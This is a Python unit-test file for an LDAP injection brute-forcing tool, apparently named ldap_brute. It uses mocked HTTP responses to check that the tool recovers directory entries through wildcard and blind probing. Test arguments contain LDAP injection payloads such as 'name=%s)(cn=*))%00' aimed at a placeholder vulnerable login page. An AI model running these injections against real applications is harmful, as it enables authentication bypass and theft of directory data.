from httmock import urlmatch, HTTMock, all_requests
from mock import patch
import unittest, requests, string, ldap_brute

TRUE_STRING = "true string"
FALSE_STRING = "false string"
BASE_URL = "http://example.com/?vulnparam=%s%%00"
DEFAULT_CHARSET = string.ascii_lowercase + string.digits
DEFAULT_ATTRIBUTE = "cn"

def url_valid(url, valid):
    for v in valid:
        if v in url.query:
            return True

    return False

def request_proc(url, valid):

    if url_valid(url, valid):
        return TRUE_STRING

    return FALSE_STRING

def parse_and_main(cli_args):
    parser = ldap_brute.parser_get()
    args = parser.parse_args(cli_args)
    ldap_brute.main(args, output=False)

@all_requests
def wildcard_admin(url, request):
    valid = ["=a*",
            "=ad*",
            "=adm*",
            "=admi*",
            "=admin*"]

    return request_proc(url, valid)

@all_requests
def wildcard_adm_hckr(url, valid):
    valid = ["=a*",
            "=ad*",
            "=adm*",
            "=admi*",
            "=admin*",
            "=admin2*",
            "=h*",
            "=ha*",
            "=hac*",
            "=hack*",
            "=hacke*",
            "=hacker*"]

    return request_proc(url, valid)

@all_requests
def nowildcard_admin(url, valid):
    valid = ["(%s=user)" % DEFAULT_ATTRIBUTE]

    return request_proc(url, valid)

@all_requests
def attribute_uid(url, valid):
    valid = ["(uid=*)"]

    return request_proc(url, valid)

class LdapBruteTest(unittest.TestCase):
    def test_wildcard_basic(self):
        with HTTMock(wildcard_admin):
            res = ldap_brute.brute(BASE_URL, TRUE_STRING, DEFAULT_CHARSET)

        self.assertEquals(['admin'], res, "Result should contain admin")

    def test_wildcard_multiple(self):
        with HTTMock(wildcard_adm_hckr):
            res = ldap_brute.brute(BASE_URL, TRUE_STRING, DEFAULT_CHARSET)

        self.assertEquals(['admin2', 'hacker'], res, "Result should contain the two entries hacker and admin2.")

    def test_nowildcard_simple(self):
        with HTTMock(nowildcard_admin):
            res = ldap_brute.brute_nowild(BASE_URL, TRUE_STRING, string.ascii_lowercase, DEFAULT_ATTRIBUTE, 4, size_is_exact=True)

        self.assertEquals(['user'], res, "Result should contain user.")

    def test_attribute_simple(self):
        with HTTMock(attribute_uid):
            res = ldap_brute.brute_nowild(BASE_URL, TRUE_STRING, string.ascii_lowercase, ldap_brute.LDAP_GLOBALS.BRUTE, 3, size_is_exact=True)

        self.assertEquals(["uid"], res)

    @patch("ldap_brute.brute")
    def test_main_brute(self, mocked_method):
        mocked_method.return_value = []
        cli_args = ['http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password=',
            'AUTHENTICATED as']

        parse_and_main(cli_args)

        self.assertTrue(ldap_brute.brute.called, "Should have called ldap_brute.brute")

    @patch("ldap_brute.brute_nowild")
    def test_main_nowild(self, mocked_method):
        mocked_method.return_value = []
        cli_args = ['--no-wildcard', "-a", "gidNumber", "-c", "digits",
                    "--max-word-size", "5",
                    "http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=",
                    "AUTHENTICATED as"]

        parse_and_main(cli_args)

        self.assertTrue(ldap_brute.brute_nowild.called, "Should have called ldap_brute.brute_nowild")

    @patch("ldap_brute.brute_nowild")
    def test_main_att(self, mocked_method):
        mocked_method.return_value = []
        cli_args = ["-A", "-c", "lower", "--max-word-size=4", "http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=", "AUTHENTICATED as"]

        parse_and_main(cli_args)

        self.assertTrue(ldap_brute.brute_nowild.called, "Should have called ldap_brute.brute_nowild")

if __name__ == '__main__':
    unittest.main()